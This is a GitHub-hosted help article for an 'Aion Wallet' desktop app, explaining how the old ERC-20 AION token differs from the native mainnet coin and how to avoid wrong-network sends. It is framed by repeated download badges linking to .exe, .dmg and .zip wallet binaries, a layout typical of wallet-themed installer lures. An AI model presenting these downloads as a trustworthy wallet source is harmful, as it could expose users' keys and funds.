![Aion Wallet](assets/banner-article.png)

# Aion ERC-20 or mainnet: which token is which

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

AION exists in two historical forms: an ERC-20 token on Ethereum from the original sale, and the native coin on the Aion mainnet, and only the native coin is convertible in practice because the bridge that swapped one for the other closed in January 2022.

Anyone holding an ERC-20 balance today is holding a record of the sale rather than a spendable AION balance, and that distinction decides which wallet, which address and which instructions apply.

## You'll see this if

- You found an old wallet with an AION token entry on Ethereum.
- An exchange shows two assets with similar names.
- You are reading a 2018 guide that describes a swap process.
- You are unsure whether your AION is on mainnet at all.

## The two forms at a glance

| | ERC-20 AION | Native AION |
|---|---|---|
| Network | Ethereum | Aion mainnet, chain ID 256 |
| Address format | 40 hexadecimal characters after 0x | `0xa0` plus 62 characters, 66 total |
| What it is | A token contract balance | The network's own coin |
| Can it be converted? | No, the swap closed in 2022 | It is the destination form |
| Where it is held | An Ethereum wallet | Aion Wallet or another Aion client |

The address format is the fastest way to tell them apart. A 42-character string is an Ethereum address; a 66-character string beginning `0xa0` is an Aion one.

## How the swap worked

The original process locked ERC-20 tokens on Ethereum and issued native AION on mainnet, which was one of the earliest production examples of a cross-chain bridge. A manual route existed for holders who missed the initial window, and that route was retired.

The final deadline was 31 January 2022. After it, no official process converts the ERC-20 token, and the [Aion token swap closed](https://github.com/aion-wallet/aion-explained/blob/main/aion-token-swap-closed.md) article covers what that means for an old balance.

## What to do with an old ERC-20 balance

Check it, record it, and do not send it anywhere on the promise of a conversion. A token contract balance is visible on an Ethereum explorer, and its existence is a historical fact rather than a claim on the network.

Any service that offers to convert it now is either operating on a different asset or taking a fee for something it cannot do. Neither is worth the risk.

## Telling which one you hold in a wallet

Open the receive screen. An Aion address is 66 characters and begins `0xa0`; an Ethereum address is 42 and begins `0x` with any hexadecimal character.

If a wallet shows an AION entry but no Aion network, it is displaying the ERC-20 token. If it shows an address in the Aion format, it is the native coin.

The [Aion address format](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-address-format-0xa0.md) guide covers the length check in more detail.

## Sending the native coin

Native AION moves between Aion addresses, and a transfer to an Ethereum address is not recoverable by the sender. That is the single most expensive mistake in this area, and it happens when someone assumes the two forms share an address space.

Before sending, confirm the destination is 66 characters and begins `0xa0`, and confirm the wallet is on mainnet with chain ID 256, as listed in the [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) guide.

Wallets make this harder than it needs to be, because a single interface can display tokens from several networks in one list. The list is a convenience; the network behind each row is the fact that matters, and a row without a network label should be treated as unknown until you open it.

## Prevention

Keep the two forms separate in your notes. A record that says "AION" without saying which network is not a record.

Do not follow old swap instructions. The process they describe no longer exists, and a page that still offers it should be read as history.

Use the current wallet for the native coin, and an Ethereum wallet only to view the old token, never to receive new funds.

## Fees, confirmations and why they differ

The two forms settle on different networks, so their fees are paid in different assets and their confirmation behaviour has nothing in common. A native AION transfer pays its fee in AION on chain ID 256; an ERC-20 token transfer pays an Ethereum fee in ether.

That matters when someone compares two transfers and concludes one network is cheaper or faster. They are measuring two systems, not two settings of one system.

It also matters for recovery. A native transfer that went to the wrong address is a matter for the recipient on the Aion network; a token transfer that went to a contract address on Ethereum follows Ethereum's rules, which are stricter. The [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) article lists the identifiers that tell you which network a wallet is actually using.

## Frequently asked questions

### Can I swap my ERC-20 AION now?

No. The official swap closed on 31 January 2022.

### Is the ERC-20 token worth anything?

That is a market question rather than a technical one, and it is outside what this guide covers. What can be said is that it is not native AION and cannot be converted through the project.

### Why did the project use two forms at all?

Because the sale happened on Ethereum before mainnet existed, and the swap moved holders onto the network once it launched.

### How do I know my wallet holds native AION?

The address begins with `0xa0` and is 66 characters long.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion token swap closed](https://github.com/aion-wallet/aion-explained/blob/main/aion-token-swap-closed.md) - the 2022 deadline in detail.
- [Aion address format](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-address-format-0xa0.md) - the length check that prevents a wrong-network send.
- [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) - confirming mainnet.
- [What is Aion](https://github.com/aion-wallet/aion-explained/blob/main/what-is-aion.md) - the network the native coin belongs to.
